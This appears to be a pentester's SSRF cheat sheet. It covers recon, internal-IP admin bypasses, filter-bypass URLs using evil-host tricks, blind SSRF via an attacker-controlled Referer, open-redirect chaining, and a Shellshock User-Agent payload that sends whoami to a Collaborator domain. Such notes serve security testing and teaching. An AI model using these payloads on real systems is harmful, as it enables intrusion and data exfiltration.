![[SSRF.jpg]]
# Recon

Identify any request parameters that appear to contain hostnames, IP addresses or full/partial URLs. Modify each parameter's value to specify another resource, similiar to the one requested and see if it appears in the response.

Try to specify a URL resource that you control out on the Internet and monitor it for connections. If no connections are received, monitor the time taken for the app to respond. If there is a delay it could be a time-out connection due to network restrictions.
# Access Control Bypass

Use a localhost or valid internal IP through a SSRF vector, to potentially bypass access controls implemented on sensitive resources on the app that only allow access to admin users or through a specific IP address/network-interface:

Some examples:

```html
http://localhost/admin
```

```html
http://192.168.0.5:8080/admin
```
# Resource Enumeration

Change the parameter value to another resource and analyse how the app responds. You can probe for port numbers, internal IPs, different hostnames and analyse the app's responses. Ideally, you should know how the app responds to a valid vs invalid specific resource, so you can easily determine when an injected value is valid:

Some examples:

```html
http://192.168.0.1:22/
```

```html
http://192.168.0.1:8080/
```
# Bypass for Disallow-List Filter

If the app is blocking requests for http://127.0.0.1 and /admin resources, you can try the following bypass techniques such as other representations of 127.0.0.1:

```html
http://127.0.0.1/
```

Or URL encoding:

```html
%68%74%74%70%3a%2f%2f%31%32%37%2e%31
```

Obfuscation/Case Variations:

```html
http://127.0.0.1/AdMiN
```
# Bypasses for Allow-List Filter

If the app is only checking that a specific host is somewhere within the parameter, you can bypass this restriction with the following payloads such as embed credentials @ in a URL before hostname:

```bash
https://expected-host@evil-host/
```

Or # character specifies a URL fragment:

```bash
https://evil-host/#expected-host
```

Or a complex method to bypass allow list restrictions (try to encode/double-encode the \#\/@ characters too):

```bash
https://evil-host/#evil-host@expected-host/evil-path
```

```bash
https://expected-host@evil-host/evil-path#
```
# Blind SSRF

If the app does not return any notable differences in the responses from the SSRF payloads, then you can use Blind SSRF techniques such as injecting a payload that triggers an HTTP connection to a domain you control and monitor for any network traffic.

Inject this payload in all susceptible parameters and headers (Referer):

- Example - Referer: https\://ATTACKER_SERVER
# SSRF via Open Redirection

The goal here is to find both an Open Redirection and SSRF vulnerability. The SSRF vector may only allow webroot paths within the same target application. Inject the Open Redirection payload within the SSRF vector and identify how the application responds.

As an example. an open redirection vulnerability you can supply whatever you want in the "path" parameter and it will reflect on the "Location" HTTP response header:

```bash
/product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080/admin
```

SSRF vulnerability via the "stockApi" parameter (URL encoding may be required for certain characters in the payload to process correctly):

```bash
stockApi=/product/nextProduct?currentProductId=1%26path=http://192.168.0.12:8080/admin
```
# Blind SSRF with Shellshock Exploitation

The app may be vulnerable to an SSRF vulnerability through the Referer header. The HTTP interaction contains the User-Agent String within the request. The payload could be:

```bash
User-Agent: () { :; }; /usr/bin/nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN
```

Enumerate an internal resource that the app can reach and place this payload in the Referer header:

```bash
Example: Referer: 192.168.0.2:8080
```

The ShellShock payload will be executed in the context of that internal resource and we'll get the "user" (whoami) of the system sent to Burp Collaborator.